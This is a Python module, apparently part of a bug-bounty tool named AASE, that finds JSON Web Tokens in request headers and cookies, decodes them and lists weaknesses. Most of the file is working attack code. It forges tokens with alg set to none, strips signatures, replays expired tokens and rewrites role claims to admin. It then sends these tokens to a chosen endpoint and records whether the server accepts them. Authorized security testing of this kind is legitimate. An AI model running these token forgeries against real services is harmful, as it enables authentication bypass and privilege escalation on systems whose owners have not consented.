"""
AASE JWT Analysis Module — Pure Python JWT analysis for bug bounty.
Decodes, analyzes, and generates attack variants for JWTs.
No pyjwt dependency — uses only stdlib base64 + json.
"""
from __future__ import annotations
import base64, hashlib, hmac, json, logging, re, time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional
import httpx

logger = logging.getLogger("aase.jwt_analyzer")

JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_\-]*")

def _b64_decode(s: str) -> bytes:
    s = s.replace("-", "+").replace("_", "/")
    pad = 4 - len(s) % 4
    if pad != 4: s += "=" * pad
    return base64.b64decode(s)

def _b64_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

@dataclass
class JWTInfo:
    raw: str
    header: Dict[str, Any] = field(default_factory=dict)
    payload: Dict[str, Any] = field(default_factory=dict)
    signature: str = ""
    algorithm: str = "unknown"
    is_expired: bool = False
    expiry_delta: Optional[str] = None
    issuer: Optional[str] = None
    subject: Optional[str] = None
    audience: Optional[str] = None
    issued_at: Optional[str] = None
    claims: List[str] = field(default_factory=list)
    vulnerabilities: List[str] = field(default_factory=list)
    source: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "raw_preview": self.raw[:20] + "..." + self.raw[-10:] if len(self.raw) > 40 else self.raw,
            "header": self.header, "payload": self.payload, "algorithm": self.algorithm,
            "is_expired": self.is_expired, "expiry_delta": self.expiry_delta,
            "issuer": self.issuer, "subject": self.subject, "audience": self.audience,
            "issued_at": self.issued_at, "claims": self.claims,
            "vulnerabilities": self.vulnerabilities, "source": self.source,
        }

@dataclass
class JWTAttackResult:
    attack_type: str
    token_used: str
    url: str
    method: str
    original_status: Optional[int] = None
    attack_status: Optional[int] = None
    success: bool = False
    detail: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "attack_type": self.attack_type, "url": self.url, "method": self.method,
            "original_status": self.original_status, "attack_status": self.attack_status,
            "success": self.success, "detail": self.detail,
            "token_preview": self.token_used[:30] + "..." if len(self.token_used) > 30 else self.token_used,
        }

@dataclass
class JWTAnalysisResult:
    tokens: List[JWTInfo] = field(default_factory=list)
    attacks: List[JWTAttackResult] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "tokens": [t.to_dict() for t in self.tokens],
            "attacks": [a.to_dict() for a in self.attacks],
            "total_tokens": len(self.tokens),
            "total_attacks": len(self.attacks),
            "successful_attacks": sum(1 for a in self.attacks if a.success),
            "errors": self.errors,
        }

# ---------- Detection ----------

def detect_jwts(headers: Dict[str, str], cookies: Optional[Dict[str, str]] = None) -> List[tuple[str, str]]:
    """Find JWTs in Authorization headers, cookies, and custom headers. Returns [(token, source)]."""
    found: List[tuple[str, str]] = []
    for name, value in headers.items():
        for match in JWT_RE.finditer(value):
            found.append((match.group(0), f"header:{name}"))
    if cookies:
        for name, value in cookies.items():
            for match in JWT_RE.finditer(value):
                found.append((match.group(0), f"cookie:{name}"))
    return found

# ---------- Decode ----------

def decode_jwt(token: str) -> JWTInfo:
    """Decode a JWT without signature verification."""
    parts = token.split(".")
    info = JWTInfo(raw=token)
    if len(parts) < 2:
        info.vulnerabilities.append("Malformed JWT (less than 2 parts)")
        return info

    try:
        info.header = json.loads(_b64_decode(parts[0]))
    except Exception:
        info.header = {"error": "Could not decode header"}

    try:
        info.payload = json.loads(_b64_decode(parts[1]))
    except Exception:
        info.payload = {"error": "Could not decode payload"}

    info.signature = parts[2] if len(parts) > 2 else ""
    info.algorithm = info.header.get("alg", "unknown")
    info.issuer = info.payload.get("iss")
    info.subject = info.payload.get("sub")
    info.audience = str(info.payload.get("aud", ""))
    info.claims = list(info.payload.keys())

    # Check expiry
    exp = info.payload.get("exp")
    if exp:
        try:
            exp_time = float(exp)
            now = time.time()
            if exp_time < now:
                info.is_expired = True
                delta_secs = int(now - exp_time)
                if delta_secs < 3600: info.expiry_delta = f"Expired {delta_secs}s ago"
                elif delta_secs < 86400: info.expiry_delta = f"Expired {delta_secs // 3600}h ago"
                else: info.expiry_delta = f"Expired {delta_secs // 86400}d ago"
            else:
                delta_secs = int(exp_time - now)
                if delta_secs < 3600: info.expiry_delta = f"Valid for {delta_secs}s"
                elif delta_secs < 86400: info.expiry_delta = f"Valid for {delta_secs // 3600}h"
                else: info.expiry_delta = f"Valid for {delta_secs // 86400}d"
        except (ValueError, TypeError):
            pass

    iat = info.payload.get("iat")
    if iat:
        try:
            info.issued_at = time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(float(iat)))
        except Exception:
            pass

    # Weakness checks
    if info.algorithm.lower() == "none":
        info.vulnerabilities.append("Algorithm is 'none' — token may be unsigned")
    if info.algorithm.lower() in ("hs256", "hs384", "hs512"):
        info.vulnerabilities.append(f"Uses symmetric algorithm ({info.algorithm}) — vulnerable to key brute-force")
    if not info.signature or info.signature == "":
        info.vulnerabilities.append("Empty signature")
    if "kid" in info.header:
        info.vulnerabilities.append(f"Contains 'kid' header — potential SQL injection or path traversal via kid")
    if "jku" in info.header:
        info.vulnerabilities.append("Contains 'jku' header — potential SSRF via JWK Set URL")
    if "x5u" in info.header:
        info.vulnerabilities.append("Contains 'x5u' header — potential SSRF via X.509 URL")
    if info.is_expired:
        info.vulnerabilities.append(f"Token is expired ({info.expiry_delta})")
    if info.payload.get("admin") or info.payload.get("role") in ("admin", "superadmin", "root"):
        info.vulnerabilities.append("Contains admin/elevated role claim — test privilege escalation")

    return info

# ---------- Attack token builders ----------

def build_alg_none_token(token: str) -> str:
    """Rebuild the token with alg:none and empty signature."""
    parts = token.split(".")
    if len(parts) < 2: return token
    try:
        header = json.loads(_b64_decode(parts[0]))
    except Exception:
        return token
    header["alg"] = "none"
    new_header = _b64_encode(json.dumps(header, separators=(",", ":")).encode())
    return f"{new_header}.{parts[1]}."

def build_stripped_sig_token(token: str) -> str:
    """Remove the signature from the token."""
    parts = token.split(".")
    if len(parts) < 2: return token
    return f"{parts[0]}.{parts[1]}."

def build_expired_token(token: str) -> str:
    """Return the token as-is for expired replay testing."""
    return token

def build_role_tampered_token(token: str) -> Optional[str]:
    """If token has role/admin claims, try to escalate."""
    parts = token.split(".")
    if len(parts) < 2: return None
    try:
        payload = json.loads(_b64_decode(parts[1]))
    except Exception:
        return None
    modified = False
    if "role" in payload and payload["role"] != "admin":
        payload["role"] = "admin"; modified = True
    if "admin" in payload and not payload["admin"]:
        payload["admin"] = True; modified = True
    if "is_admin" in payload and not payload["is_admin"]:
        payload["is_admin"] = True; modified = True
    if not modified:
        return None
    new_payload = _b64_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{parts[0]}.{new_payload}."

# ---------- Attack execution ----------

async def run_jwt_attacks(
    token: str, test_url: str, test_method: str = "GET",
    auth_header_name: str = "Authorization", auth_prefix: str = "Bearer ",
    original_status: Optional[int] = None,
) -> List[JWTAttackResult]:
    """Run all JWT attack variants against a target endpoint."""
    results: List[JWTAttackResult] = []
    attacks = [
        ("alg_none", build_alg_none_token(token)),
        ("signature_stripped", build_stripped_sig_token(token)),
        ("expired_replay", build_expired_token(token)),
    ]
    role_token = build_role_tampered_token(token)
    if role_token:
        attacks.append(("role_escalation", role_token))

    async with httpx.AsyncClient(timeout=10.0, follow_redirects=True) as client:
        for attack_name, attack_token in attacks:
            try:
                headers = {auth_header_name: f"{auth_prefix}{attack_token}", "User-Agent": "AASE-JWTAnalyzer/1.0"}
                resp = await client.request(test_method, test_url, headers=headers)
                # An attack succeeds if we get 2xx with a modified token
                success = 200 <= resp.status_code < 300
                if original_status and resp.status_code == original_status:
                    success = True
                detail = f"Attack '{attack_name}' returned status {resp.status_code}"
                if success:
                    detail += " — SERVER ACCEPTED MODIFIED TOKEN"
                results.append(JWTAttackResult(
                    attack_type=attack_name, token_used=attack_token, url=test_url,
                    method=test_method, original_status=original_status,
                    attack_status=resp.status_code, success=success, detail=detail,
                ))
            except Exception as exc:
                results.append(JWTAttackResult(
                    attack_type=attack_name, token_used=attack_token, url=test_url,
                    method=test_method, success=False, detail=f"Error: {exc}",
                ))
    return results

# ---------- Full analysis orchestrator ----------

async def analyze_jwt(
    headers: Dict[str, str],
    cookies: Optional[Dict[str, str]] = None,
    test_url: Optional[str] = None,
    test_method: str = "GET",
) -> JWTAnalysisResult:
    """Full JWT analysis: detect → decode → attack."""
    result = JWTAnalysisResult()
    found_tokens = detect_jwts(headers, cookies)
    if not found_tokens:
        return result
    seen: set = set()
    for token, source in found_tokens:
        if token in seen: continue
        seen.add(token)
        info = decode_jwt(token)
        info.source = source
        result.tokens.append(info)
    if test_url and result.tokens:
        try:
            token = result.tokens[0].raw
            attacks = await run_jwt_attacks(token, test_url, test_method)
            result.attacks.extend(attacks)
        except Exception as exc:
            result.errors.append(f"Attack phase: {exc}")
    return result
